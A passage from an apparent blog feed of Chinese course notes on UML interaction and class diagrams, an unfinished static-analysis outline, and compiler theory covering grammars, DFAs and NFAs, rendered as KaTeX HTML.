tabindex="-1">UML交互图</h3><ul><li><p>作用：刻画对象间的消息传递，分析如何通过交互协作完成功能</p><ul><li>用例的功能实现方式</li><li>软件系统在某种使用场景下对象间的交互协作流程</li><li>软件系统的某个复杂操作的逻辑实现模型</li></ul></li><li><p>二类交互图</p><ul><li>顺序图(Sequence Diagram)：强调消息传递的时间序</li><li>通信图(Communication Diagram)：突出对象间的合作</li><li>顺序图和通信图语义上等价，没必要针对同一建模目标同时创建这二个图</li></ul></li><li><p>顺序图：描述对象间的消息交互序列</p><ul><li>纵向：时间轴，对象及其生命线(虚线)，活跃期(长条矩形)</li><li>横向：对象间的消息传递<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E4%BA%A4%E4%BA%92%E5%9B%BE%E4%B9%8B%E9%A1%BA%E5%BA%8F%E5%9B%BE.jpg" alt></li></ul></li></ul><h3 id="%E7%B1%BB%E5%9B%BE" tabindex="-1">类图</h3><ul><li>功效：描述系统的类构成，刻画系统的静态组成结构</li><li>图的构成<ul><li>结点：表示系统中的类（或接口）及其属性和操作</li><li>边：类之间的关系</li></ul></li><li>类的表示<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%B1%BB%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt></li><li>属性的表示：<ul><li>[可见性] 名称 [: 类型] [多重性] [= 初值]  [{约束特性}]</li><li>可见性<ul><li>公开(+): 所有对象均可访问</li><li>保护(#): 所在类及子类对象均可访问</li><li>私有(-): 仅所在类的对象才可访问</li></ul></li><li>多重性：属性取值数量, 如1，0…1，0…* ，1…<em>，</em></li><li>约束特性<ul><li changeable>可更改性：{readOnly}表示只读，缺省为</li><li unordered>顺序性： {ordered}表示属性取值是有序的，缺省为</li><li>唯一性： {bag}表示属性取值元素允许出现重复元素（缺省）</li><li>静态性：{static}表示静态属性，属性值由类所有实例对象共享</li></ul></li></ul></li><li>方法的表示<ul><li>[可见性]  名称[(参数表)] [: 返回类型] [{约束特性}]</li><li>操作的约束特性<ul><li>查询操作： {isQuery = true}表示查询操作，{ isQuery = false}表示修改操作，缺省为修改操作。</li><li>多态性：{isPolymorphic = true}表示本操作允许多态，即可被子类中相同定义形式的操作所覆盖</li><li>并发性：{concurrency = sequential} 任一时刻只有一个对象调用可执行。{concurrency = guarded} 并行线程可同时调用多个对象的本操作，但同一时刻只允许一个调用执行。{concurrency = concurrent} 并行线程可以同时调用多个对象的本操作且这些调用可并发执行</li><li>异常：操作在执行过程中可能引发异常</li></ul></li></ul></li><li>接口<ul><li>一种不包含操作实现部分的特殊类</li><li>接口的形式<ul><li>供给接口: 对外提供的接口</li><li>需求接口: 需要使用的接口</li></ul></li></ul></li><li>类间的关系<ul><li>关联</li><li>依赖</li><li>集成</li><li>实现</li><li>聚合</li><li>组成</li></ul></li><li>类图注意事项<ul><li>用单数名词来描述类名，少用缩写</li><li>按照方向表示类间关系<ul><li>垂直方向表示继承关系</li><li>水平方向表示关联、聚合、组合、依赖、实现关系</li></ul></li><li>注意画图位置<ul><li>关联名应位于关联边的居中位置</li><li>多重性、角色名、约束特性等应靠近关联端</li></ul></li></ul></li></ul><h3 id="%E5%88%86%E6%9E%90%E5%92%8C%E5%BB%BA%E7%AB%8B%E7%94%A8%E4%BE%8B%E7%9A%84%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%9E%8B" tabindex="-1">分析和建立用例的交互模型</h3><ul><li><p>任务:分析和描述用例是如何通过一组对象之间的交互来完成的</p></li><li><p>步骤</p><ul><li>分析和确定用例所涉及的对象及其类</li><li>分析和确定对象之间的消息传递</li><li>绘制用例的交互图</li></ul></li><li><p>软件需求用例的处理通常涉及三种不同类对象:边界类，控制类，实体类</p></li><li></li><li><p>边界类</p><ul><li>定义：由于这些类对象处于系统的边界，需与系统外的执行者进行交互，因而将这些对象所对应的类称之为边界类</li><li>作用<ul><li>交互控制，处理外部执行者的输入数据，或者向外部执行者输出数据</li><li>外部接口，如果外部执行者表现为其他的系统或者设备，那么边界类对象需要与系统之外的其他系统或设备进行信息交互</li></ul></li></ul></li><li><p>控制类</p><ul><li>控制类对象作为完成用例任务的主要协调者</li><li>一般而言，控制类并不负责处理具体的任务细节，而是负责分解任务，并通过消息传递将任务分派给其他对象类来完成，协调这些对象之间的信息交互</li></ul></li><li><p>实体类</p><ul><li>用例所对应业务流程中的所有具体功能最终要交由具体的类对象来完成，这些类称之为实体类<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%94%A8%E4%BE%8B%E7%9A%84%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%9E%8B.jpg" alt></li></ul></li><li><p>分析和确定对象之间的消息</p><ul><li>确定消息的名称<ul><li>直接反映了对象间交互的意图，也体现了接收方对象所对应的类需承担的职责和任务</li><li>意图：请求、通知</li><li>一般地，消息名称用动名词来表示</li></ul></li><li>确定消息传递的信息<ul><li>信息：通知和请求的内容</li><li>这些信息通常以消息参数的形式出现，也即一个对象在向另一个对象发送消息的过程中，需要提供必要的参数，以向目标对象提供相应的信息</li></ul></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件分析（未完）</title>
      <link href="/2023/08/16/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/16/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<img src="/images/meitu/6.jpg"><p>本笔记参考<a href="https://www.bilibili.com/video/BV1b7411K7P4/?spm_id_from=333.337.search-card.all.click&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频</a></p><h2 id="01%E4%BB%8B%E7%BB%8D" tabindex="-1">01介绍</h2><ol><li>PL and Static Analysis</li><li>Why We Learn Static Analysis?</li><li>What is Static Analysis?</li><li>Static Analysis Features and Examples</li><li>Teaching Plan</li><li>Evaluation Criteria</li></ol><h3 id="1-pl-and-static-analysis" tabindex="-1">1 PL and Static Analysis</h3><p>PL：Programming Languages程序语言</p><h3 id="2-why-we-learn-static-analysis%3F" tabindex="-1">2 Why We Learn Static Analysis?</h3><h3 id="3-what-is-static-analysis%3F" tabindex="-1">3 What is Static Analysis?</h3><h3 id="4-static-analysis-features-and-examples" tabindex="-1">4 Static Analysis Features and Examples</h3><h3 id="5-teaching-plan" tabindex="-1">5 Teaching Plan</h3><h3 id="6-evaluation-criteria" tabindex="-1">6 Evaluation Criteria</h3><h2 id="02" tabindex="-1">02</h2><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理</title>
      <link href="/2023/08/16/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86_%E8%AF%BE%E7%A8%8B/"/>
      <url>/2023/08/16/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86_%E8%AF%BE%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="2%E6%96%87%E6%B3%95%E5%92%8C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%AE%9A%E4%B9%89" tabindex="-1">2文法和语言的形式定义</h2><h3 id="1-%E6%96%87%E6%B3%95%E5%8F%8A%E5%85%B6%E5%88%86%E7%B1%BB" tabindex="-1">1 文法及其分类</h3><ul><li><p>文法是产生式的又穷非空的集合</p></li><li><p>文法<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>是一个四元组，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo stretchy="false">[</mo><mi>S</mi><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator="true">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G[S]=(V_N,V_T,P,S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq></p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>N</mi></msub><mo>:</mo></mrow><annotation encoding="application/x-tex">V_N:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>非终结符号集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub><mo>:</mo></mrow><annotation encoding="application/x-tex">V_T:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>终结符号集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">P:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>表示产生式的有穷非空集合</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">S:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>开始符号（识别符号），至少在一条产生式中作为左部</li></ul></li><li><p>文法分类：</p><ul><li>乔姆斯基(Chomsky)把文法分成四种类型：0型、1型、2型和3型</li><li>0型文法 短语结构文法 Phrase Structure Gramma</li><li>1型文法 上下文有关文法 Context-Sensitive Gramma</li><li>2型文法 上下文无关文法 Context Free Gram</li><li>3型文法 正规(正则)文法 Regular Gramma<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%96%87%E6%B3%95%E7%9A%84%E5%88%86%E7%B1%BB.jpg" alt="文法的分类"></li></ul></li></ul><h3 id="2-%E8%AF%AD%E8%A8%80%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%AE%9A%E4%B9%89" tabindex="-1">2 语言的形式定义</h3><h2 id="3%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">3词法分析</h2><h3 id="1-dfa" tabindex="-1">1 DFA</h3><ul><li><p>确定的有穷自动机的形式定义<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi><mtext>，</mtext><mi>D</mi><mi>F</mi><mi>A</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>t</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">DFA， DFA=(Q,\sum,t,q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span></eq></p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">Q:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷非空的状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">\sum:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷的输入字母表</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">t:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>映射<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>×</mo><mo>∑</mo><mo>→</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q\times \sum \rightarrow Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub><mo>:</mo><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">q_0:\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，是开始状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>:</mo><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">F:\subseteq Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，非空终止状态集合</li></ul></li><li><p>FA的表示</p><ul><li><ol><li>状态转换表</li></ol></li><li><ol start="2"><li>状态转换图<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/DFA%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt="DFA的表示"></li></ol></li></ul></li><li><p>被<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">DFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span></span></span></span></eq> <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>识别的字符转集合记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq></p></li><li><p>确定的有穷自动机中确定的含义：</p><ul><li><ol><li>只有唯一的一个开始状态</li></ol></li><li><ol start="2"><li>下一个输入字母唯一地确定了下一个状态</li></ol></li></ul></li></ul><h3 id="2-nfa" tabindex="-1">2 NFA</h3><ul><li>非确定的有穷自动机地形式定义<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">NFA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">NF</span><span class="mord mathnormal">A</span></span></span></span></eq> <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>F</mi><mi>A</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>t</mi><mo separator="true">,</mo><msub><mi>Q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">NFA=(Q,\sum,t,Q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">NF</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span></eq><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">Q:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷非空的状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">\sum:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>有穷的输入字母表</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">t:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>映射<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>×</mo><mo>∑</mo><mo>→</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q\times \sum \rightarrow Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mn>0</mn></msub><mo>:</mo><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q_0:\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，是开始状态集</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>:</mo><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">F:\subseteq Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span 